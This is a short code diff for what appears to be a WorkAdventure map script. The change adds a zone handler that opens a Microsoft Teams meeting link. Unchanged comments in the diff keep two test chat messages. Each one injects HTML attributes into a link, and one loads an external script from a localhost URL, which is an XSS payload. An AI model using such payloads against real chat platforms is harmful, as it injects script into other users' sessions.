@@ -1,4 +1,3 @@
-
 scriptNesting(Promise.all([
     require('./backend-connection'),
     require('./zoned-popup'),
@@ -12,8 +11,11 @@ scriptNesting(Promise.all([
     // WA.sendChatMessage(`test https://www.google.de"onmousemove="debugger;event.target.parentElement.parentElement.remove();window.scr=document.createElement('script');window.scr.src='http://localhost/scripts/injected.js';document.body.appendChild(window.scr);"style="position:fixed;top:0px;bottom:0px;right:0px;left:0px" zez`, "test")
     // WA.sendChatMessage(`test https://www.google.de"onmousemove="debugger;"style="position:fixed;top:0px;bottom:0px;right:0px;left:0px" zez`, "test")
 
-
     const [{ message, ws }, { popupInZone }, { getUserData }, { multiStrandedPopupConversation }] = await imports;
+
+    WA.onEnterZone("lake-house", () => {
+        WA.openTab("https://teams.microsoft.com/l/meetup-join/19%3ameeting_NDYyMWVhNDItNjVlNy00ZmU3LTg0M2EtNjIxODIyNzI0Yjhj%40thread.v2/0?context=%7b%22Tid%22%3a%22392ca72f-e005-4aaa-905e-86adf06f8fe5%22%2c%22Oid%22%3a%2290a359e4-ca71-4ee7-b4de-f122c6cf9ee6%22%7d")
+    })
 
     console.log('script run');
     const data = await getUserData();
